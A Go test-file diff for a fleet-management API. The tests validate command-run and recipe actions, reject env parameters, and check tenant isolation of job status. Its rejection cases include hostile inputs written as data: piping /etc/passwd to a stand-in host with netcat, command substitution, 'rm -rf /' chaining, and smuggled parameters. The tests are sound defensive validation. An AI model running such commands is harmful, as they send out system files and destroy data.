@@ -139,24 +139,24 @@ func cmdAction(cmd string) map[string]any {
 // dropping a param.
 func TestFarmerActionParamsContract(t *testing.T) {
 	in := farmerCmdRun{Command: "systemctl", Args: []string{"restart", "nginx"}, CWD: "/tmp", RunAs: "www",
-		Env: map[string]string{"A": "1"}, Timeout: 42 * time.Second}
+		Timeout: 42 * time.Second}
 	b, _ := json.Marshal(in)
 	var got apitypes.CmdRun
 	if err := json.Unmarshal(b, &got); err != nil {
 		t.Fatalf("decoding into apitypes.CmdRun: %v", err)
 	}
 	if got.Command != in.Command || strings.Join(got.Args, " ") != "restart nginx" || got.CWD != in.CWD ||
-		got.RunAs != in.RunAs || got.Env["A"] != "1" || got.Timeout != in.Timeout {
+		got.RunAs != in.RunAs || len(got.Env) != 0 || got.Timeout != in.Timeout {
 		t.Fatalf("apitypes.CmdRun = %+v, from %s", got, b)
 	}
 
-	cin := farmerCook{Recipe: "nginx.harden", Env: "prod", Test: true}
+	cin := farmerCook{Recipe: "nginx.harden", Test: true}
 	b, _ = json.Marshal(cin)
 	var cook apitypes.CmdCook
 	if err := json.Unmarshal(b, &cook); err != nil {
 		t.Fatalf("decoding into apitypes.CmdCook: %v", err)
 	}
-	if string(cook.Recipe) != cin.Recipe || cook.Env != cin.Env || !cook.Test {
+	if string(cook.Recipe) != cin.Recipe || cook.Env != "" || !cook.Test {
 		t.Fatalf("apitypes.CmdCook = %+v, from %s", cook, b)
 	}
 }
@@ -171,16 +171,14 @@ func TestTranslateCmdRun(t *testing.T) {
 		t.Fatalf("args form: %+v, %q", out, msg)
 	}
 	for name, in := range map[string]cmdRunInput{
-		"empty":         {Cmd: "  "},
-		"quotes":        {Cmd: `echo "hi there"`},
-		"pipe":          {Cmd: "cat /etc/passwd | nc evil 1"},
-		"subst":         {Cmd: "echo $(id)"},
-		"nul":           {Cmd: "ls\x00"},
-		"negative":      {Cmd: "ls", TimeoutSeconds: -1},
-		"too long":      {Cmd: "ls", TimeoutSeconds: 601},
-		"env with =":    {Cmd: "ls", Env: map[string]string{"A=B": "c"}},
-		"empty env key": {Cmd: "ls", Env: map[string]string{"": "c"}},
-		"huge cmd":      {Cmd: strings.Repeat("a", maxCmdLen+1)},
+		"empty":    {Cmd: "  "},
+		"quotes":   {Cmd: `echo "hi there"`},
+		"pipe":     {Cmd: "cat /etc/passwd | nc evil 1"},
+		"subst":    {Cmd: "echo $(id)"},
+		"nul":      {Cmd: "ls\x00"},
+		"negative": {Cmd: "ls", TimeoutSeconds: -1},
+		"too long": {Cmd: "ls", TimeoutSeconds: 601},
+		"huge cmd": {Cmd: strings.Repeat("a", maxCmdLen+1)},
 	} {
 		if _, msg := translateCmdRun(in); msg == "" {
 			t.Errorf("%s: accepted %+v", name, in)
@@ -227,6 +225,8 @@ func TestCreateSproutActionBatch_Validation(t *testing.T) {
 		{"cmd.run stream_topic smuggled", map[string]any{"asset_ids": []string{"a1"}, "action": map[string]any{"type": "cmd.run", "params": map[string]any{"cmd": "ls", "stream_topic": "grlx.x"}}}, "invalid_request"},
 		{"cmd.run farmer-shaped params", map[string]any{"asset_ids": []string{"a1"}, "action": map[string]any{"type": "cmd.run", "params": map[string]any{"command": "ls"}}}, "invalid_request"},
 		{"cmd.run shell syntax", map[string]any{"asset_ids": []string{"a1"}, "action": cmdAction("ls; rm -rf /")}, "invalid_request"},
+		{"cmd.run env not accepted", map[string]any{"asset_ids": []string{"a1"}, "action": map[string]any{"type": "cmd.run", "params": map[string]any{"cmd": "ls", "env": map[string]string{"TOKEN": "s3cret"}}}}, "invalid_request"},
+		{"cook env not accepted", map[string]any{"asset_ids": []string{"a1"}, "action": map[string]any{"type": "cook", "params": map[string]any{"recipe": "x", "env": "prod"}}}, "invalid_request"},
 		{"cook without recipe", map[string]any{"asset_ids": []string{"a1"}, "action": map[string]any{"type": "cook", "params": map[string]any{"test": true}}}, "invalid_request"},
 		{"cook token smuggled", map[string]any{"asset_ids": []string{"a1"}, "action": map[string]any{"type": "cook", "params": map[string]any{"recipe": "x", "token": "t"}}}, "invalid_request"},
 	}
@@ -454,7 +454,8 @@ func TestSproutActionBatch_CookRunningThenRefreshedFromJobs(t *testing.T) {
 		t.Fatalf("farmer requests = %+v", reqs)
 	}
 
-	// No reader installed: running, with the jid.
+	// The default reader (farmer.job_status) with no index rows yet:
+	// running, with the jid.
 	_, got := getBatch(t, tid, batchID)
 	if got.Status != actionBatchInProgress {
 		t.Fatalf("batch status = %s, want in_progress", got.Status)
@@ -466,29 +467,36 @@ func TestSproutActionBatch_CookRunningThenRefreshedFromJobs(t *testing.T) {
 	}
 
 	// A reader error degrades to the stored state.
-	reader := &fakeJobReader{err: errors.New("object store down")}
+	reader := &fakeJobReader{err: errors.New("database down")}
 	SetJobStatusReader(reader)
-	t.Cleanup(func() { SetJobStatusReader(nil) })
+	t.Cleanup(func() { SetJobStatusReader(farmerJobStatusReader{}) })
 	if code, got := getBatch(t, tid, batchID); code != 200 || got.Status != actionBatchInProgress {
 		t.Fatalf("GET with failing reader: %d %+v", code, got)
-	}
-
-	// One job finished, one failed.
-	reader.err = nil
-	reader.outcomes = map[JobRef]JobOutcome{
-		{SproutID: "web-01", JID: jids["web-01"]}: JobOutcomeSucceeded,
-		{SproutID: "web-02", JID: jids["web-02"]}: JobOutcomeFailed,
-	}
-	_, got = getBatch(t, tid, batchID)
-	items := itemsByAsset(got)
-	if got.Status != actionBatchCompleted || items["c1"].Status != ActionItemSucceeded ||
-		items["c2"].Status != ActionItemFailed || items["c2"].Error != errCodeJobFailed || items["c2"].JID == "" {
-		t.Fatalf("after refresh: %+v", got)
 	}
 	for _, rt := range reader.tenants {
 		if rt != tid {
 			t.Fatalf("reader asked about tenant %q, want %q", rt, tid)
 		}
+	}
+	SetJobStatusReader(farmerJobStatusReader{})
+
+	// Another tenant's index row for the same sprout_id and jid is not
+	// this tenant's job, and a still-running job stays running.
+	other := mustCreateActiveTenant(t, gdb)
+	mustInsertFarmerJobStatus(t, gdb, other, "web-01", jids["web-01"], "succeeded")
+	mustInsertFarmerJobStatus(t, gdb, tid, "web-02", jids["web-02"], "running")
+	if _, got := getBatch(t, tid, batchID); got.Status != actionBatchInProgress {
+		t.Fatalf("after other tenant's / running rows: %+v", got)
+	}
+
+	// One job finished, one failed.
+	mustInsertFarmerJobStatus(t, gdb, tid, "web-01", jids["web-01"], "succeeded")
+	mustInsertFarmerJobStatus(t, gdb, tid, "web-02", jids["web-02"], "failed")
+	_, got = getBatch(t, tid, batchID)
+	items := itemsByAsset(got)
+	if got.Status != actionBatchCompleted || items["c1"].Status != ActionItemSucceeded ||
+		items["c2"].Status != ActionItemFailed || items["c2"].Error != errCodeJobFailed || items["c2"].JID == "" {
+		t.Fatalf("after refresh: %+v", got)
 	}
 
 	// Recorded: a later GET doesn't need the reader.
